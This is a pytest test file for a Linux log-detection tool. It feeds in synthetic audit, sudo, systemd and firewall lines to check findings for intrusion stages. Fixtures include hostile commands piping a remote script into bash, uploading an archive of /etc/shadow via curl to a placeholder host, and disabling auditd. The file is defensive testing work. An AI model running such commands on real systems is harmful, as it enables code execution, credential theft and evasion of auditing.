from ipaddress import ip_address

import pytest

from sentinel.detection.linux_review import linux_findings
from sentinel.ingest.linux import parse_linux


def replay(*messages):
    raw = "\n".join(messages).encode()
    parsed = parse_linux(raw, file_format="text", source_file="linux-review.log", upload_id="linux-review")
    indices = {event.event_id: event.record_index for event in parsed.events}
    return [(entry["title"], entry["finding"]["timestamp_utc"],
             [indices[id_] for id_ in entry["finding"]["evidence_event_ids"]])
            for entry in linux_findings(parsed.events)]


def test_legacy_audit_rules_preserve_unknown_utc_and_bind_process_links():
    findings = replay(
        'Nov  4 01:00:00 box audit[100]: EXECVE uid=33 ppid=50 exe="/usr/bin/dash" a0="sh" a1="-c" a2="curl http://example.test/a | bash"',
        'Nov  4 01:00:02 box audit[101]: EXECVE uid=33 ppid=100 exe="/usr/bin/wget" a0="wget" a1="http://example.test/b" a2="-O" a3="/dev/shm/.test"',
        'Nov  4 01:00:02 other audit[101]: EXECVE uid=33 ppid=100 exe="/usr/bin/wget" a0="wget" a1="http://example.test/b" a2="-O" a3="/dev/shm/.test"',
        'Nov  4 01:00:03 box audit[102]: EXECVE uid=101 ppid=100 exe="/usr/bin/wget" a0="wget" a1="http://example.test/b" a2="-O" a3="/dev/shm/.test"',
        'Nov  5 01:00:04 box audit[103]: EXECVE uid=33 ppid=100 exe="/usr/bin/wget" a0="wget" a1="http://example.test/b" a2="-O" a3="/dev/shm/.test"',
    )
    assert findings == [
        ("Remote script piped into a shell", None, [1]),
        ("Linked download into a temporary directory", None, [1, 2]),
    ]


def test_legacy_sudo_and_ssh_lookalikes_do_not_create_breach_findings():
    assert replay(
        "Nov  4 01:00:00 box sudo: ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/apt update",
        "Nov  4 01:00:01 box sudo: ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2",
        "Nov  4 01:00:02 box sshd[102]: Accepted publickey for root from 192.0.2.3 port 10300 ssh2",
        "Nov  4 01:00:03 box CRON[104]: (root) CMD (/usr/local/bin/backup-rsync.sh)",
        "Nov  4 01:00:04 box kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.1 DST=192.0.2.3 DPT=3333",
        'Nov  4 01:00:05 box audit[105]: EXECVE uid=0 ppid=1 exe="/usr/sbin/iptables" a0="iptables" a1="-L"',
    ) == []


def test_audit_stop_outcome_requires_matching_earlier_command():
    report = "Nov  4 01:00:02 box systemd[1]: Stopping Security Auditing Service..."
    assert replay(report) == []
    assert replay(
        'Nov  4 01:00:01 box audit[100]: EXECVE uid=0 ppid=50 exe="/usr/bin/systemctl" a0="systemctl" a1="stop" a2="auditd"',
        report,
    ) == [
        ("Audit service stop attempt", None, [1]),
        ("Audit service stopping reported", None, [1, 2]),
    ]


def test_sudo_audit_stop_cites_request_and_same_host_outcome():
    command = "Nov  4 01:00:00 box sudo: ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd.service"
    outcome = "Nov  4 01:00:02 box systemd[1]: Stopping Security Auditing Service..."
    assert replay(command, outcome.replace("box", "other"), outcome) == [
        ("Audit service stop attempt", None, [1]),
        ("Audit service stopping reported", None, [1, 3]),
    ]
    assert replay(command.replace("USER=root", "USER=ops"),
                  command.replace(" stop ", " status "),
                  command.replace("auditd.service", "auditd-helper.service"),
                  command.replace("TTY=", "user NOT in sudoers ; TTY=")) == []


@pytest.mark.parametrize(("arguments", "title"), [
    ("/usr/sbin/auditctl -e 0", "Kernel auditing disable attempt"),
    ("/sbin/auditctl -e0", "Kernel auditing disable attempt"),
    ("/bin/systemctl --no-block stop auditd.service", "Audit service stop attempt"),
    ("/bin/systemctl --no-block stop nginx", None),
    ("/bin/systemctl --no-block status auditd", None),
    ("/usr/sbin/auditctl -e 1", None),
    ("/usr/sbin/auditctl -s", None),
])
def test_sudo_audit_commands_are_targeted(arguments, title):
    command = f"Nov  4 01:00:00 box sudo: ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND={arguments}"
    assert replay(command) == ([(title, None, [1])] if title else [])


def test_auditctl_flags_disable_but_allows_inspection_and_enable():
    command = 'Nov  4 01:00:00 box audit[100]: EXECVE uid=0 ppid=50 exe="/usr/sbin/auditctl" a0="auditctl" a1="-e" a2="0"'
    assert replay(command, command.replace('"-e" a2="0"', '"-e0"')) == [
        ("Kernel auditing disable attempt", None, [1]),
        ("Kernel auditing disable attempt", None, [2]),
    ]
    assert replay(command.replace('a2="0"', 'a2="1"'),
                  command.replace('"-e" a2="0"', '"-s"'),
                  command.replace("uid=0", "uid=1000")) == []


def test_archive_link_requires_matching_path_and_terminal():
    assert replay(
        "Nov  4 01:00:00 box bash[10]: root : TTY=pts/1 : COMMAND=tar czf /dev/shm/fixture.tgz /etc/shadow /home",
        "Nov  4 01:00:01 box bash[11]: root : TTY=pts/2 : COMMAND=curl -T /dev/shm/fixture.tgz https://example.test/up",
        "Nov  4 01:00:02 box bash[12]: root : TTY=pts/1 : COMMAND=curl -T /dev/shm/different.tgz https://example.test/up",
        "Nov  4 01:00:03 box bash[13]: root : TTY=pts/1 : COMMAND=curl -T /dev/shm/fixture.tgz https://example.test/up",
    ) == [
        ("Sensitive archive staging attempt", None, [1]),
        ("Upload attempt for staged sensitive archive", None, [1, 4]),
    ]


LINKED_SERVICE = (
    'Nov  4 01:00:00 box audit[100]: EXECVE uid=33 ppid=50 exe="/usr/bin/dash" a0="sh" a1="-c" a2="curl http://example.test/a | bash"',
    'Nov  4 01:00:02 box audit[101]: EXECVE uid=33 ppid=100 exe="/usr/bin/wget" a0="wget" a1="http://192.0.2.10/b" a2="-O" a3="/dev/shm/.test"',
    "Nov  4 01:00:30 box pkexec[200]: web: Executing command [USER=root] [TTY=unknown] [CWD=/dev/shm] [COMMAND=/bin/sh]",
    'Nov  4 01:00:31 box audit[201]: EXECVE uid=0 ppid=200 exe="/usr/bin/dash" a0="sh" a1="-i"',
    'Nov  4 01:01:00 box audit[202]: EXECVE uid=0 ppid=201 exe="/usr/bin/tee" a0="tee" a1="/etc/systemd/system/helper.service"',
    "Nov  4 01:01:10 box systemd[1]: Started helper.service.",
)
FIRST_ATTEMPT = "Nov  4 01:02:00 box kernel: [10.10] [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.1 DST=192.0.2.10 PROTO=TCP SPT=40000 DPT=8443 SYN"
SECOND_ATTEMPT = FIRST_ATTEMPT.replace("01:02:00", "01:30:00").replace("40000", "40001")
LEAD_TITLE = "Repeated outbound connection attempts to a linked address"


def test_network_lead_cites_two_outbound_attempts_and_exact_host_evidence():
    findings = replay(*LINKED_SERVICE, FIRST_ATTEMPT, SECOND_ATTEMPT)
    assert findings[-1] == (LEAD_TITLE, None, [2, 6, 7, 8])
    assert [title for title, _, _ in findings].count(LEAD_TITLE) == 1


@pytest.mark.parametrize("second", [
    SECOND_ATTEMPT.replace("40001", "40000"),
    SECOND_ATTEMPT.replace("192.0.2.10", "192.0.2.11"),
    SECOND_ATTEMPT.replace("DPT=8443", "DPT=443"),
    SECOND_ATTEMPT.replace("box kernel:", "other kernel:"),
    SECOND_ATTEMPT.replace("UFW ALLOW", "UFW BLOCK"),
    SECOND_ATTEMPT.replace("IN= OUT=eth0", "IN=eth1 OUT=eth0"),
    SECOND_ATTEMPT.replace("SYN", "ACK SYN"),
    SECOND_ATTEMPT.replace("SPT=40001", "SPT=65536"),
    SECOND_ATTEMPT.replace("01:30:00", "01:48:00"),
])
def test_network_lead_rejects_unmatched_or_ambiguous_firewall_records(second):
    assert all(title != LEAD_TITLE for title, _, _ in replay(*LINKED_SERVICE, FIRST_ATTEMPT, second))


@pytest.mark.parametrize("host_context", [(), LINKED_SERVICE[:2], LINKED_SERVICE[2:]])
def test_repeated_connections_require_download_and_linked_service_context(host_context):
    assert all(title != LEAD_TITLE for title, _, _ in replay(*host_context, FIRST_ATTEMPT, SECOND_ATTEMPT))


AUDIT_STAMP = "audit(1760000000.120:381)"
NATIVE_SYSCALL = f'Nov  4 01:00:00 box auditd[50]: type=SYSCALL msg={AUDIT_STAMP}: success=yes pid=220 ppid=50 uid=33 exe="/usr/bin/dash"'
ENCODED_SHELL = b"curl http://example.test/a | bash".hex().upper()
NATIVE_ARGV = f'Nov  4 01:00:00 box auditd[50]: type=EXECVE msg={AUDIT_STAMP}: argc=3 a0="sh" a1="-c" a2={ENCODED_SHELL}'


def test_native_audit_pair_uses_both_records_and_the_syscall_pid():
    child = ('Nov  4 01:00:02 box audit[221]: EXECVE uid=33 ppid=220 exe="/usr/bin/wget" '
             'a0="wget" a1="http://example.test/b" a2="-O" a3="/dev/shm/.test"')
    assert replay(NATIVE_ARGV, NATIVE_SYSCALL, child) == [
        ("Remote script piped into a shell", None, [1, 2]),
        ("Linked download into a temporary directory", None, [1, 2, 3]),
    ]
    kernel = [line.replace("auditd[50]: type=", "kernel: audit: type=").replace("msg=", "")
              for line in (NATIVE_SYSCALL.replace("SYSCALL", "1300"), NATIVE_ARGV.replace("EXECVE", "1309"))]
    assert replay(*kernel) == [("Remote script piped into a shell", None, [1, 2])]


@pytest.mark.parametrize("events", [
    (NATIVE_SYSCALL,),
    (NATIVE_ARGV,),
    (NATIVE_SYSCALL.replace("success=yes", "success=no"), NATIVE_ARGV),
    (NATIVE_SYSCALL, NATIVE_ARGV.replace(":381", ":382")),
    (NATIVE_SYSCALL, NATIVE_ARGV.replace("box auditd", "other auditd")),
    (NATIVE_SYSCALL, NATIVE_ARGV, NATIVE_ARGV),
    (NATIVE_SYSCALL, NATIVE_ARGV.replace("argc=3", "argc=4")),
    (NATIVE_SYSCALL, NATIVE_ARGV.replace("a2=", "a2[0]=")),
])
def test_native_audit_needs_complete_unambiguous_process_evidence(events):
    assert replay(*events) == []


CONNECTED = "Hidden root executable connected to a linked address"


def socket_pair(time, serial, *, image="/usr/local/bin/.payload", address="192.0.2.10", port=8443,
                arch="c000003e", syscall=42, euid=0, result="success=yes exit=0"):
    stamp = f"audit(1760000010.100:{serial})"
    ip = ip_address(address)
    family = (2 if ip.version == 4 else 10).to_bytes(2, "little")
    before, after = (b"", bytes(8)) if ip.version == 4 else (bytes(4), bytes(4))
    encoded = (family + port.to_bytes(2, "big") + before + ip.packed + after).hex()
    return (
        f'Nov  4 {time} box auditd[50]: type=SYSCALL msg={stamp}: arch={arch} syscall={syscall} {result} pid=220 euid={euid} exe="{image}"',
        f"Nov  4 {time} box auditd[50]: type=SOCKADDR msg={stamp}: saddr={encoded}",
    )


def test_process_linked_connection_and_generic_lead_are_distinguished():
    attacks = (*socket_pair("01:02:00", 401), FIRST_ATTEMPT, *socket_pair("01:30:00", 402), SECOND_ATTEMPT)
    results = replay(*LINKED_SERVICE, *attacks)
    assert [indices for title, _, indices in results if title == CONNECTED] == [[2, 6, 9, 7, 8], [2, 6, 12, 10, 11]]
    assert all(title != LEAD_TITLE for title, _, _ in results)

    other_process = tuple(line.replace("/usr/local/bin/.payload", "/usr/bin/curl") for line in attacks)
    results = replay(*LINKED_SERVICE, *other_process)
    assert all(title != CONNECTED for title, _, _ in results)
    assert results[-1] == (LEAD_TITLE, None, [2, 6, 9, 12])


@pytest.mark.parametrize("options", [
    {"arch": "40000003", "syscall": 42},
    {"syscall": 43},
    {"result": "success=no exit=-115"},
    {"euid": 1001},
    {"address": "192.0.2.11"},
    {"port": 0},
])
def test_process_linked_connection_requires_supported_successful_root_endpoint(options):
    assert all(title != CONNECTED for title, _, _ in replay(*LINKED_SERVICE, *socket_pair("01:02:00", 401, **options)))


def test_ambiguous_firewall_records_stay_out_of_process_findings():
    duplicate_peer = FIRST_ATTEMPT.replace("40000", "40001")
    findings = replay(*LINKED_SERVICE, *socket_pair("01:02:00", 401), FIRST_ATTEMPT, duplicate_peer)
    assert next(indices for title, _, indices in findings if title == CONNECTED) == [2, 6, 7, 8]


def test_another_in_progress_connection_prevents_firewall_attribution():
    pending = socket_pair("01:02:00", 402, image="/usr/bin/curl", result="success=no exit=-115")
    findings = replay(*LINKED_SERVICE, *socket_pair("01:02:00", 401), *pending, FIRST_ATTEMPT)
    assert next(indices for title, _, indices in findings if title == CONNECTED) == [2, 6, 7, 8]


def test_socket_pair_can_read_ipv6_arm64_and_refuses_mismatched_audit_ids():
    prefix = [line.replace("http://192.0.2.10/b", "http://[2001:db8::10]/b") for line in LINKED_SERVICE]
    first, second = socket_pair("01:02:00", 401, address="2001:db8::10", arch="c00000b7", syscall=203)
    assert any(title == CONNECTED for title, _, _ in replay(*prefix, first, second))
    assert all(title != CONNECTED for title, _, _ in replay(*prefix, first, second.replace(":401", ":402")))
    assert all(title != CONNECTED for title, _, _ in replay(*prefix, first, second.replace("box auditd", "other auditd")))
